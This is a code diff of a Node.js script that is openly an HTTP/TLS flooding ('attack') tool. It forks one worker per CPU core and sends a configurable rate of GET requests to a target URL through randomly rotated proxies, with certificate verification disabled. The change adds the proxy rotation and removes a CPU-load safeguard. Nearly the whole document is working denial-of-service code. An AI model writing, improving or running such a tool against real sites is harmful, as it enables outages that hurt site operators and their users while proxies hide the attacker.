@@ -1,47 +1,41 @@
+const cluster = require('cluster');
 const fs = require('fs');
-const { Worker, isMainThread, workerData } = require('worker_threads');
 const tls = require('tls');
 const { URL } = require('url');
 const os = require('os');
 
-if (isMainThread) {
-    if (process.argv.length < 7) {
-        console.error("Usage: node script.js <url> <time> <rps> <threads> <proxy.txt>");
-        process.exit(1);
+const targetURL = process.argv[2];
+const duration = parseInt(process.argv[3], 10);
+const rps = parseInt(process.argv[4], 10);
+const proxyFile = process.argv[5];
+
+if (!targetURL || !duration || !rps || !proxyFile) {
+    console.error("Usage: node script.js <url> <time> <rps> <proxy.txt>");
+    process.exit(1);
+}
+
+const proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(p => p.trim());
+
+if (cluster.isMaster) {
+    console.log(`Starting attack on ${targetURL} for ${duration} seconds using ${os.cpus().length} cores`);
+
+    for (let i = 0; i < os.cpus().length; i++) {
+        cluster.fork();
     }
 
-    const target = {
-        url: process.argv[2],
-        time: parseInt(process.argv[3], 10),
-        rps: parseInt(process.argv[4], 10),
-        threads: parseInt(process.argv[5], 10),
-        proxyFile: process.argv[6]
-    };
-
-    console.log(`Starting high-request TLS attack on ${target.url} for ${target.time} seconds...`);
-    
-    for (let i = 0; i < target.threads; i++) {
-        new Worker(__filename, { workerData: target });
-    }
+    setTimeout(() => {
+        console.log("Attack completed.");
+        process.exit(0);
+    }, duration * 1000);
 } else {
-    const { url, time, rps, proxyFile } = workerData;
-    const target = new URL(url);
-    const PROXY_LIST = proxyFile ? fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(p => p.trim()) : [];
+    const target = new URL(targetURL);
+    
+    function sendTLSRequest(proxy) {
+        const [proxyHost, proxyPort] = proxy.split(":");
 
-    const headers = [
-        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
-        "(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-        "Accept: */*",
-        "Accept-Encoding: gzip, deflate, br",
-        "Connection: keep-alive",
-        `Host: ${target.hostname}`,
-        "Referer: " + url
-    ];
-
-    function sendTLSRequest() {
         const options = {
-            host: target.hostname,
-            port: 443,
+            host: proxyHost,
+            port: proxyPort || 8080,
             servername: target.hostname,
             rejectUnauthorized: false
         };
@@ -49,8 +43,10 @@ if (isMainThread) {
         const client = tls.connect(options, () => {
             for (let i = 0; i < rps; i++) {
                 const request = `GET ${target.pathname} HTTP/1.1\r\n` +
-                                headers.join("\r\n") +
-                                "\r\n\r\n";
+                                `Host: ${target.hostname}\r\n` +
+                                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" +
+                                "Accept: */*\r\n" +
+                                "Connection: keep-alive\r\n\r\n";
                 client.write(request);
             }
         });
@@ -64,14 +60,8 @@ if (isMainThread) {
         });
     }
 
-    const interval = setInterval(() => {
-        const cpuUsage = os.loadavg()[0];
-        if (cpuUsage > 0.98 * os.cpus().length) {
-            console.log("CPU usage exceeded 98%. Restarting...");
-            process.exit(1);
-        }
-        sendTLSRequest();
+    setInterval(() => {
+        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
+        sendTLSRequest(proxy);
     }, 1000);
-
-    setTimeout(() => clearInterval(interval), time * 1000);
 }
